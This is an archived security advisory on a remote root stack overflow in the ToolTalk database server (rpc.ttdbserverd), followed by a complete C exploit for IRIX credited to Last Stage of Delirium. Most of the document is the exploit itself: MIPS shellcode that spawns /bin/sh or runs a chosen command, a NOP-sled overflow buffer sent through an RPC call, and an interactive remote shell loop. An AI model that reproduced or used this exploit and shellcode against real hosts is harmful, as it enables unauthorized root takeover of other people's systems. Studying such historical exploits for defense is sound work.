source: http://www.securityfocus.com/bid/122/info
 
An implementation fault in the ToolTalk object database server allows a remote attacker to run arbitrary code as the superuser on hosts supporting the ToolTalk service. The affected program runs on many popular UNIX operating systems supporting CDE and some Open Windows installs.
 
The ToolTalk service allows independently developed applications to communicate with each other by exchanging ToolTalk messages. Using ToolTalk, applications can create open protocols which allow different programs to be interchanged, and new programs to be plugged into the system with minimal reconfiguration.
 
The ToolTalk database server (rpc.ttdbserverd) is an ONC RPC service which manages objects needed for the operation of the ToolTalk service. ToolTalk-enabled processes communicate with each other using RPC calls to this program, which runs on each ToolTalk-enabled host. This program is a standard component of the ToolTalk system, which ships as a standard component of many commercial Unix operating systems. The ToolTalk database server runs as root.
 
Due to an implementation fault in rpc.ttdbserverd, it is possible for a malicious remote client to formulate an RPC message that will cause the server to overflow an automatic variable on the stack. By overwriting activation records stored on the stack, it is possible to force a transfer of control into arbitrary instructions provided by the attacker in the RPC message, and thus gain total control of the server process.
/*## copyright LAST STAGE OF DELIRIUM jul 1998 poland        *://lsd-pl.net/ #*/
/*## rpc.ttdbserverd                                                         #*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

#define ADRNUM 2000
#define NOPNUM 18000

#define TTDBSERVERD_PROG 100083
#define TTDBSERVERD_VERS 1
#define TTDBSERVERD_ISERASE 7

char findsckcode[]=
    "\x04\x10\xff\xff"       /* bltzal  $zero,<findsckcode>  */
    "\x24\x10\x01\x90"       /* li      $s0,400              */
    "\x22\x11\xff\xb0"       /* addi    $s1,$s0,-80          */
    "\x22\x12\xff\xac"       /* addi    $s2,$s0,-84          */
    "\x22\x0d\xfe\x98"       /* addi    $t5,$s0,-360         */
    "\x03\xed\x68\x20"       /* add     $t5,$ra,$t5          */
    "\x01\xa0\xf0\x09"       /* jalr    $s8,$t5              */

    "\x8f\xeb\xff\xc0"       /* lw      $t3,-64($ra)         */
    "\x31\x6b\xff\xff"       /* andi    $t3,$t3,0xffff       */
    "\x21\x6b\x00\x00"       /* addi    $t3,$t3,0            */
    "\x22\x0d\xfe\xc0"       /* addi    $t5,$s0,-320         */
    "\x11\x60\xff\xf9"       /* beqz    $t3,<findsckcode+20> */

    "\x22\x24\xfe\xd4"       /* addi    $a0,$s1,-300         */
    "\x23\xe5\xff\xc0"       /* addi    $a1,$ra,-64          */
    "\x23\xe6\xff\xbc"       /* addi    $a2,$ra,-68          */
    "\xaf\xf2\xff\xbc"       /* sw      $s2,-68($ra)         */
    "\x24\x02\x04\x45"       /* li      $v0,1093             */
    "\x03\xff\xff\xcc"       /* syscall                      */
    "\x22\x31\xff\xff"       /* addi    $s1,$s1,-1           */
    "\x10\xe0\xff\xf3"       /* beqz    $a3,<findsckcode+28> */
    "\x22\x2b\xfe\xd4"       /* addi    $t3,$s1,-300         */
    "\x1d\x60\xff\xf6"       /* bgzt    $t3,<findsckcode+48> */

    "\x22\x04\xfe\x72"       /* addi    $a0,$s0,-398         */
    "\x24\x02\x03\xee"       /* li      $v0,1006             */
    "\x03\xff\xff\xcc"       /* syscall                      */
    "\x22\x24\xfe\xd5"       /* addi    $a0,$s1,-299         */
    "\x22\x05\xfe\x72"       /* addi    $a1,$s0,-398         */
    "\x24\x02\x04\x11"       /* li      $v0,1041             */
    "\x03\xff\xff\xcc"       /* syscall                      */
    "\x22\x10\xff\xff"       /* addi    $s0,$s0,-1           */
    "\x22\x0b\xfe\x72"       /* addi    $t3,$s0,-398         */
    "\x05\x61\xff\xf6"       /* bgez    $t3,<findsckcode+88> */
;

char shellcode[]=
    "\x04\x10\xff\xff"       /* bltzal  $zero,<shellcode>    */
    "\x24\x02\x03\xf3"       /* li      $v0,1011             */
    "\x23\xff\x01\x14"       /* addi    $ra,$ra,276          */
    "\x23\xe4\xff\x08"       /* addi    $a0,$ra,-248         */
    "\x23\xe5\xff\x10"       /* addi    $a1,$ra,-220         */
    "\xaf\xe4\xff\x10"       /* sw      $a0,-220($ra)        */
    "\xaf\xe0\xff\x14"       /* sw      $zero,-236($ra)      */
    "\xa3\xe0\xff\x0f"       /* sb      $zero,-241($ra)      */
    "\x03\xff\xff\xcc"       /* syscall                      */
    "/bin/sh"
;

char cmdshellcode[]=
    "\x04\x10\xff\xff"       /* bltzal  $zero,<cmdshellcode> */
    "\x24\x02\x03\xf3"       /* li      $v0,1011             */
    "\x23\xff\x08\xf4"       /* addi    $ra,$ra,2292         */
    "\x23\xe4\xf7\x40"       /* addi    $a0,$ra,-2240        */
    "\x23\xe5\xfb\x24"       /* addi    $a1,$ra,-1244        */
    "\xaf\xe4\xfb\x24"       /* sw      $a0,-1244($ra)       */
    "\x23\xe6\xf7\x48"       /* addi    $a2,$ra,-2232        */
    "\xaf\xe6\xfb\x28"       /* sw      $a2,-1240($ra)       */
    "\x23\xe6\xf7\x4c"       /* addi    $a2,$ra,-2228        */
    "\xaf\xe6\xfb\x2c"       /* sw      $a2,-1236($ra)       */
    "\xaf\xe0\xfb\x30"       /* sw      $zero,-1232($ra)     */
    "\xa3\xe0\xf7\x47"       /* sb      $zero,-2233($ra)     */
    "\xa3\xe0\xf7\x4a"       /* sb      $zero,-2230($ra)     */
    "\x02\x04\x8d\x0c"       /* syscall                      */
    "\x01\x08\x40\x25"       /* or      $t0,$t0,$t0          */
    "/bin/sh -c  "
;

static char nop[]="\x24\x0f\x12\x34";

typedef struct{char *string;}req_t;

bool_t xdr_req(XDR *xdrs,req_t *obj){
    if(!xdr_string(xdrs,&obj->string,~0)) return(FALSE);
    return(TRUE);
}

main(int argc,char **argv){
    char buffer[30000],address[4],*b,*cmd;
    int i,c,n,flag=1,vers=6,port=0,sck;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;

    printf("copyright LAST STAGE OF DELIRIUM jul 1998 poland  //lsd-pl.net/\n");
    printf("rpc.ttdbserverd for irix 5.2 5.3 6.2 6.3 6.4 6.5 6.5.2 ");
    printf("IP:17,19-22,25-28,30,32\n\n");

    if(argc<2){
        printf("usage: %s address [-s|-c command] [-p port] [-v 5]\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"sc:p:v:"))!=-1){
        switch(c){
        case 's': flag=1;break;
        case 'c': flag=0;cmd=optarg;break;
        case 'p': port=atoi(optarg);break;
        case 'v': vers=atoi(optarg);
        }
    }

    if(vers==5) *(unsigned long*)address=htonl(0x7fff24f4+2000+9000+32700);
    else *(unsigned long*)address=htonl(0x7fff24f4+2000+9000);

    printf("adr=0x%08x timeout=%d ",ntohl(*(unsigned long*)address),tm.tv_sec);
    fflush(stdout);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(port);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("error");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    sck=RPC_ANYSOCK;
    if(!(cl=clnttcp_create(&adr,TTDBSERVERD_PROG,TTDBSERVERD_VERS,&sck,0,0))){
        clnt_pcreateerror("error");exit(-1);
    }

    b=buffer;
    for(i=0;i<ADRNUM;i++) *b++=address[i%4];
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    if(flag){
        i=sizeof(struct sockaddr_in);
        if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){
            struct netbuf {unsigned int maxlen;unsigned int len;char *buf;};
            struct netbuf nb;
            ioctl(sck,(('S'<<8)|2),"sockmod");
            nb.maxlen=0xffff;
            nb.len=sizeof(struct sockaddr_in);;
            nb.buf=(char*)&adr;
            ioctl(sck,(('T'<<8)|144),&nb);
        }
        n=-ntohs(adr.sin_port);
        printf("port=%d connected! ",-n);fflush(stdout);

        findsckcode[36+2]=(unsigned char)((n&0xff00)>>8);
        findsckcode[36+3]=(unsigned char)(n&0xff);
        for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];
        for(i=0;i<4;i++) *b++=nop[i%4];
        for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    }else{
        printf("connected! ");fflush(stdout);
        for(i=0;i<strlen(cmdshellcode);i++) *b++=cmdshellcode[i];
        for(i=0;i<4;i++) *b++=' ';
        for(i=0;i<strlen(cmd);i++) *b++=cmd[i];
    }
    *b++=':';
    *b=0;

    req.string=buffer;
    cl->cl_auth=authunix_create("localhost",0,0,0,NULL);
    stat=clnt_call(cl,TTDBSERVERD_ISERASE,xdr_req,&req,xdr_void,NULL,tm);
    printf("sent!\n");
    if(!flag) exit(0);

    write(sck,"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}